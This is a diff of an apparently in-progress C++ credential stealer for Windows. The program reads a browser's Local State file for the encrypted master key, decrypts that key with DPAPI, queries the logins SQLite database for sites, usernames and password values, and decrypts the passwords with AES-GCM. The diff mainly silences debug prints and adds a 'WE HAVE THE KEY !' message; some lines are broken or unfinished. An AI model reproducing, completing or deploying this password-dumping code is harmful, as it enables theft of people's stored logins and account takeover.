@@ -28,8 +28,8 @@ std::vector<BYTE> b64Decode(std::string strInput){
         printf("2nd call failed \n");
         printf("Last error: %d\n", GetLastError());
     }
-    printf("retbuff\n");
-    printf("BYTES: %d\n", bytes);
+    //printf("retbuff\n");
+    //printf("BYTES: %d\n", bytes);
     std::vector<BYTE> ByteVector(retBuff, retBuff + bytes );
     return ByteVector;
 }
@@ -47,7 +47,7 @@ char * readFile(char * fileName){
     fseek(infile, 0L, SEEK_END);
     size = ftell(infile);
     fseek(infile, 0L, SEEK_SET);
-    printf("SIZE inside readFile: %d\n", size);
+    //printf("SIZE inside readFile: %d\n", size);
     buffer = (char *)malloc(size);
     char character;
     int i = 0;
@@ -61,7 +61,7 @@ char * readFile(char * fileName){
 }
 
  std::vector<byte> GetLocalState(){
-    printf("IN LOCAL STATE \n");
+    //printf("IN LOCAL STATE \n");
     HANDLE hToken =  GetCurrentProcessToken();
     DWORD lpcchSize = 30;
     LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
@@ -79,7 +79,6 @@ char * readFile(char * fileName){
     for (int i = 0; i < 400; i++){ //assume key is max 300 buytes kong
        
         if (b[loc + i] == '"'){
-            printf("break :%d\n", i);
             break;
         }
         key += LocalBytes[i + loc];
@@ -88,7 +87,7 @@ char * readFile(char * fileName){
     //std::cout << key << '\n';
 
     std::vector<byte> Key = b64Decode(key);
-    std::cout << "KEY after Decoding: ";
+    //std::cout << "KEY after Decoding: ";
 
     return Key;
 
@@ -96,15 +95,15 @@ char * readFile(char * fileName){
 
 PDATA_BLOB GetEncryptionKey(){
     //cant rlly test yet
-    printf("IN get encrpyt key \n");
+    //printf("IN get encrpyt key \n");
     std::vector<byte> temp_key = GetLocalState();
     BYTE * Key = temp_key.data() + 5;
     //omit first 5 chars 
-    printf("FIRST 5 chars: \n");
+    //printf("FIRST 5 chars: \n");
     for (int i = 0; i < 5; i++){
         putchar(temp_key[i]);
     }
-    printf("\nITS DPAPI\n");
+    //printf("\nITS DPAPI\n");
     //omg it actually works:((( im going to cry
     PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
     blob->cbData = temp_key.size()- 5;
@@ -120,40 +119,16 @@ PDATA_BLOB GetEncryptionKey(){
 }
 
 
-//need aem functionality desparately plus file i/o stuff asap
 static int callback(void *data, int argc, char **argv, char **azColName){
+    (char *) data
    int i;
-   printf("in callback\n");
-   
    for(i = 0; i<argc; i++){
       printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
    }
-   
+
    printf("\n");
    return 0;
 }
-/*
-BYTE* decrypt_password(BYTE* encrypted_password, BYTE *key){
-    //want bytes 3 - 15
-    std::vector<BYTE> pass = std::vector<BYTE>(encrypted_password);
-    std::vector<BYTE> VEC_IV = std::vector<BYTE>(pass.begin() + 3, pass.begin()+15); //maybe 16?
-    std::vector<BYTE> cipher = std::vector<BYTE>(pass.begin() + 15, pass.begin() + 15 + 23);
-    std::vector<BYTE> VEC_tag = std::vector<BYTE>(pass.begin() + 15 + 23, pass.end()); //check all indices
-    BYTE * textIV = VEC_IV.data() ;
-    BYTE * ciphertext = cipher.data();
-    BYTE * tag = VEC_tag.data();
-    ctBufferSize = (DWORD)cipher.size();
-    auto box = new AESGCM(key);
-    box->Decrypt(textIV, sizeof(textIV), box->ciphertext, box->ctBufferSize, box->tag, box->authTagLengths.dwMinLength );
-    for(size_t i=0; i< box->ptBufferSize; i++){
-        printf("%c", (char) box->plaintext[i]);
-    }
-    printf("\n");
-    delete box;
-    printf("Goodbye!\n");
-    return box->plaintext;
-}
-*/
 
 BYTE * getPassword(BYTE * key, BYTE * encrypted_password){
     std::vector<BYTE>VEC_IV(encrypted_password + 3, encrypted_password + 15 );
@@ -182,7 +157,6 @@ BYTE * getPassword(BYTE * key, BYTE * encrypted_password){
 
 
 int main(){
-    printf("I dump passwords!\n");
     HANDLE hToken =  GetCurrentProcessToken();
     DWORD lpcchSize = 30;
     LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
@@ -205,6 +179,7 @@ int main(){
 
    sqlite3 *db;
    char *zErrMsg = 0;
+   const char *data = "QueryRes" ;
    int rc;
     //https://www.tutorialspoint.com/sqlite/sqlite_c_cpp.htm
    rc = sqlite3_open(temp, &db);
@@ -218,8 +193,9 @@ int main(){
     const char * sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
    //const char * sql = "SELECT name, sql FROM sqlite_master";
    //const char * sql = "SELECT * FROM logins";
-   const char* data = "Callback function called";
+   //const char* data = "Callback function called";
    rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
+
    if( rc != SQLITE_OK ) {
       fprintf(stderr, "SQL error: %s\n", zErrMsg);
       sqlite3_free(zErrMsg);
@@ -228,6 +204,7 @@ int main(){
    }
    sqlite3_close(db);
     PDATA_BLOB key = GetEncryptionKey();
+    printf("\nWE HAVE THE KEY !\n");
     BYTE * encrypted_password; //get from sqlite
     BYTE * password = getPassword(key->pbData , encrypted_password);
        
